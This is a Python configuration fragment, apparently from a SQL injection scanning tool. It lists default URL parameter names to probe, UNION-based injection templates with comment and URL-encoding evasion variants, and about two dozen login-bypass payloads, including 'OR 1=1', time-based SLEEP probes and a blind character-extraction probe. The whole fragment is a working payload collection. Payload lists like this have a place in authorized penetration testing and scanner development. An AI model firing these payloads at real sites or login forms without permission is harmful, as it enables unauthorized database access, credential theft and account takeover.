# Default parameters to test if user does not provide a wordlist
DEFAULT_PARAMS = [
    "id", "page", "item", "cat", "product",
    "user", "search", "query", "name", "username"
]

# Union SQLi payload templates
UNION_PAYLOAD_TEMPLATES = [
    "' UNION SELECT {cols}--",
    "'/**/UNION/**/SELECT/**/{cols}--",
    "' UNION SELECT {cols}--+",
    "' UNION SELECT {cols}#",
    "%27%20UNION%20SELECT%20{cols}--",
    "\" UNION SELECT {cols}--",
    "1 UNION SELECT {cols}--",
    "' UNION ALL SELECT {cols}--",
    "'||(SELECT {cols})||'"
]

# Authentication bypass payloads
AUTH_BYPASS_PAYLOADS = [
    "administrator' -- ", "administrator' #", "administrator'/*",
    "' OR '1'='1' -- ", "' OR '1'='1' #", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "' OR EXISTS(SELECT 1)--", "' OR EXISTS(SELECT * FROM users)--",
    "' OR 'a'='a", "' OR 'a'='a'--", "' OR 'a'='a'#", "' OR 'a'='a'/*",
    "' OR SLEEP(5)--", "' OR IF(1=1,SLEEP(5),0)--",
    "' UNION SELECT NULL,NULL--", "' AND 1=0 UNION SELECT 'admin','password'--",
    "' OR 'x'='x' -- ", "' OR 'x'='x'#", "' OR 'x'='x'/*",
    "' OR 1=1 LIMIT 1--", "' OR 1=1 LIMIT 1 OFFSET 0--",
    "' OR ASCII(SUBSTRING((SELECT user()),1,1))>64--",
]

# Default marker for UNION testing
DEFAULT_MARKER = "NAv682"
